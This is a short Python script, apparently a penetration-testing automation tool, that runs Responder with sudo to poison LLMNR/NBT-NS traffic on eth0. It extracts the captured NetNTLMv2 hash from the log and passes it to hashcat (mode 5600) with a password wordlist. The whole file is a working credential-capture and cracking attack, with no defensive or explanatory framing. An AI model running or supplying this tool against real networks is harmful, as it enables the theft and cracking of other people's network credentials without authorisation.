import re
import subprocess
import time

def print_ascii_art():
    # ASCII art for visual appeal
    print("""
██╗░░░░░███╗░░░███╗███╗░░██╗██████╗░
██║░░░░░████╗░████║████╗░██║██╔══██╗
██║░░░░░██╔████╔██║██╔██╗██║██████╔╝
██║░░░░░██║╚██╔╝██║██║╚████║██╔══██╗
███████╗██║░╚═╝░██║██║░╚███║██║░░██║
╚══════╝╚═╝░░░░░╚═╝╚═╝░░╚══╝╚═╝░░╚═╝

░█████╗░██╗░░░██╗████████╗░█████╗░███╗░░░███╗░█████╗░████████╗██╗░█████╗░███╗░░██╗
██╔══██╗██║░░░██║╚══██╔══╝██╔══██╗████╗░████║██╔══██╗╚══██╔══╝██║██╔══██╗████╗░██║
███████║██║░░░██║░░░██║░░░██║░░██║██╔████╔██║███████║░░░██║░░░██║██║░░██║██╔██╗██║
██╔══██║██║░░░██║░░░██║░░░██║░░██║██║╚██╔╝██║██╔══██║░░░██║░░░██║██║░░██║██║╚████║
██║░░██║╚██████╔╝░░░██║░░░╚█████╔╝██║░╚═╝░██║██║░░██║░░░██║░░░██║╚█████╔╝██║░╚███║
╚═╝░░╚═╝░╚═════╝░░░░╚═╝░░░░╚════╝░╚═╝░░░░░╚═╝╚═╝░░╚═╝░░░╚═╝░░░╚═╝░╚════╝░╚═╝░░╚══╝
""")

def get_user_input():
    while True:
        try:
            timeout = int(input("Enter the timeout value (in seconds): "))
            return timeout
        except ValueError:
            print("Please enter a valid number.")

def run_responder(timeout):
    try:
        command = f"sudo timeout {timeout} script -c 'sudo responder -I eth0 -dwPv' output.log"
        subprocess.run(command, shell=True, check=True)
    except subprocess.CalledProcessError as e:
        if e.returncode == 124:  # specific error code for timeout
            print("The script has reached the specified timeout period", timeout , "seconds.")
        else:
            print("An unexpected error occurred.")
    except Exception as e:
        print("A general error occurred.")

def extract_hash():
    try:
        with open("output.log", "r") as log_file:   
            log_content = log_file.read()
        hash_value = re.search(r"Hash\s+:\s*(.*)", log_content)
        return hash_value.group(1).strip() if hash_value else None
    except FileNotFoundError:
        print("Log file not found.")
    except Exception as e:
        print(f"An error occurred while extracting the hash: {e}")

def write_hash_to_file(hash_value):
    try:
        with open("hash.txt", "w") as hash_file:
            hash_file.write(hash_value)
    except Exception as e:
        print(f"Error writing hash to file: {e}")

def clean_ansi_codes(text):
    return re.sub(r'\x1b\[[0-9;]*[mK]', '', text)

def main():
    print_ascii_art()
    timeout = get_user_input()
    run_responder(timeout)

    obtained_hash = extract_hash()
    if obtained_hash:
        print("Obtained hash:")
        print(obtained_hash)
        
        clean_hash = clean_ansi_codes(obtained_hash)
        write_hash_to_file(clean_hash)

        time.sleep(5)
        subprocess.run(f"hashcat -m 5600 ./hash.txt ./passwords.txt", shell=True)
    else:
        print("No hash was extracted.")

if __name__ == "__main__":
    main()
